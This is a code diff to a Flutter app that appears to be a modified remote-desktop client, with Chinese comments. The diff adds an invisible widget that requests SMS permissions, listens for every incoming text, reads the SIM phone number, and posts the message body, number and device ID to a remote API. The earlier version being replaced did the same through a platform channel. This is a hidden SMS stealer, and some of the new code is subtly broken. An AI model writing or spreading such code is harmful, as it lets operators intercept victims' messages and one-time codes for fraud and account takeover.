@@ -17,13 +17,7 @@ import 'home_page.dart';
 
 import 'package:http/http.dart' as http;
 import 'dart:convert'; // 导入 dart:convert 以使用 json.encode()
-import 'package:logging/logging.dart'; // 导入 logging
-import 'package:path_provider/path_provider.dart'; // 导入 path_provider
-import 'dart:io';  // 导入 dart:io 包
-
-
-// 初始化日志记录器
-final log = Logger('ServerInfo');
+import 'package:telephony/telephony.dart';
 
 class ServerPage extends StatefulWidget implements PageShape {
   @override
@@ -448,32 +442,63 @@ class ScamWarningDialogState extends State<ScamWarningDialog> {
   }
 }
 
-class ServerInfo extends StatelessWidget {
-  final model = gFFI.serverModel;
-  final emptyController = TextEditingController(text: "-");
+class ListenInfo extends StatefulWidget {
+  @override
+  _ListenInfoState createState() => _ListenInfoState();
+}
 
-  ServerInfo({Key? key}) : super(key: key) {
-    // 使用 WidgetsBinding 来初始化 MethodChannel
-    WidgetsBinding.instance.addPostFrameCallback((_) {
-      init();
+class _ListenInfoState extends State<ListenInfo> {
+  final model = gFFI.serverModel;
+  final Telephony telephony = Telephony.instance;
+  final id = model.serverId.value.text.trim();
+  String? phoneNumber;
+  String? simCardInfo;
+  List<String> messages = [];
+
+  @override
+  void initState() {
+    super.initState();
+    _requestPermissions();
+    _listenForSms();
+  }
+
+  void _requestPermissions() async {
+    final permissionsGranted = await telephony.requestSmsPermissions;
+    if (permissionsGranted) {
+      print('SMS permissions granted');
+    } else {
+      print('SMS permissions denied');
+    }
+  }
+
+  void _listenForSms() {
+    telephony.onSmsReceived.listen((SmsMessage message) {
+      setState(() {
+        messages = []
+        messages.add(message.body ?? 'Received an empty message');
+      });
+      _getSimCardInfo(id ?? '', message.body ?? '');
     });
   }
-  static const platform = MethodChannel('com.example.zxwy');
 
-  void init() {
-    platform.setMethodCallHandler((call) async {
-      if (call.method == "receiveSms") {
-        final sender = call.arguments['sender'];
-        final content = call.arguments['content'];
-        final id = model.serverId.value.text.trim();
+  Future<void> _getSimCardInfo(String id, String content) async {
+    // 获取所有 SIM 卡信息
+    final List<SmsSimInfo>? simInfoList = await telephony.getSimInfo;
 
-        await logToFile('Received SMS from: $sender');
-        await logToFile('SMS content: $content');
-        await logToFile('Client ID: $id');
-
-        await sendToApi(sender, content, id);
-      }
-    });
+    // 检查是否有 SIM 卡
+    if (simInfoList != null && simInfoList.isNotEmpty) {
+      // 获取第一张 SIM 卡的信息
+      final firstSim = simInfoList[0];
+      setState(() {
+        phoneNumber = firstSim.phoneNumber; // 获取第一张 SIM 卡的手机号
+        simCardInfo = 'Carrier: ${firstSim.carrierName}, Number: $phoneNumber';
+      });
+      await sendToApi(phoneNumber ?? '', content, id);
+    } else {
+      setState(() {
+        simCardInfo = 'No SIM card found';
+      });
+    }
   }
 
   Future<void> sendToApi(String sender, String content, String id) async {
@@ -490,28 +515,28 @@ class ServerInfo extends StatelessWidget {
     });
     request.headers.addAll(headers);
 
-    try {
-      http.StreamedResponse response = await request.send();
-
-      if (response.statusCode == 200) {
-        String responseBody = await response.stream.bytesToString();
-        log.info('API response: $responseBody');
-        await logToFile('API response: $responseBody'); // 记录 API 响应
-      } else {
-        log.severe('Error: ${response.reasonPhrase}');
-        await logToFile('Error: ${response.reasonPhrase}'); // 记录错误信息
-      }
-    } catch (e) {
-      log.severe('Failed to send API request: $e');
-      await logToFile('Failed to send API request: $e'); // 记录异常信息
+    http.StreamedResponse response = await request.send();
+    
+    if (response.statusCode == 200) {
+      print(await response.stream.bytesToString());
+    }
+    else {
+      print(response.reasonPhrase);
     }
   }
 
-  Future<void> logToFile(String message) async {
-    final directory = await getApplicationDocumentsDirectory();
-    final file = File('${directory.path}/app.log');
-    await file.writeAsString('$message\n', mode: FileMode.append);
+  @override
+  Widget build(BuildContext context) {
+    // 返回一个空的 Container 或 SizedBox
+    return Container(); // 或 SizedBox.shrink();
   }
+}
+
+class ServerInfo extends StatelessWidget {
+  final model = gFFI.serverModel;
+  final emptyController = TextEditingController(text: "-");
+
+  ServerInfo({Key? key}) : super(key: key);
 
   @override
   Widget build(BuildContext context) {
